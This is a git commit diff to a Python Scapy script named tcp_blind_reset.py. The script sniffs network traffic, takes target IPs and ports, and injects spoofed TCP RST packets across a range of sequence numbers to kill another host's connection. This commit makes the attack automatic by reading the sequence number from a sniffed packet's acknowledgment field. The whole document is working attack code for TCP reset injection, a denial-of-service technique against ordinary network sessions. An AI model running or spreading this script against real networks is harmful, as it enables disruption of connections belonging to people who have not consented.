8b035722fb7d879b4680aa412b11edecb7c8d5f0
John Doe <john@CICADA3301.local>
2021-10-12 20:50:56 +0300

    Code now finds sequence number without having the user to input it.

--- tcp_blind_reset.py
+++ tcp_blind_reset.py
@@ -3,6 +3,11 @@ from scapy.all import *
 
 conf.use_pcap = True
 
+def findSeqNum(pkt):
+	global seq_num
+	seq_num = pkt[TCP].ack
+
+
 #Sniffing network
 capture = sniff(count=25)
 capture.summary()
@@ -13,22 +18,19 @@ ip_dst = input("[*] Enter destination ip: ")
 port_src = int(input("[*] Enter source port: "))
 port_dst = int(input("[*] Enter destination port: "))
 
-cap_filter = "host " + ip_src + " and port " + str(port_src)
-pkt = sniff(filter=cap_filter, count=1)
-#pkt_seq = pkt[TCP].ack
-pkt.show()
-pkt_seq = int(input("Enter seq-num: "))
+cap_filter = "dst host " + ip_src + " and dst port " + str(port_src)
+pkt = sniff(filter=cap_filter, count=1, prn=findSeqNum)
 
-print("[+] Sending the spoofed tcp packet with sequence number=", pkt_seq)
+print("[+] Sending the spoofed tcp packet with sequence number = ", seq_num)
 IP_layer = IP(src=ip_src, dst=ip_dst)
-TCP_layer = TCP(sport=port_src, dport=port_dst,flags="R", seq=pkt_seq)
+TCP_layer = TCP(sport=port_src, dport=port_dst,flags="R", seq=seq_num)
 pkt = IP_layer/TCP_layer
 ls(pkt)
 send(pkt)
 
 print("[+] Sending more packets with higher sequence numbers...")
 for i in range(0,1000,10):
-	TCP_layer = TCP(sport=port_src, dport=port_dst,flags="R", seq=pkt_seq+i)
+	TCP_layer = TCP(sport=port_src, dport=port_dst,flags="R", seq=seq_num+i)
 	pkt = IP_layer/TCP_layer
 	send(pkt, verbose=0)
 
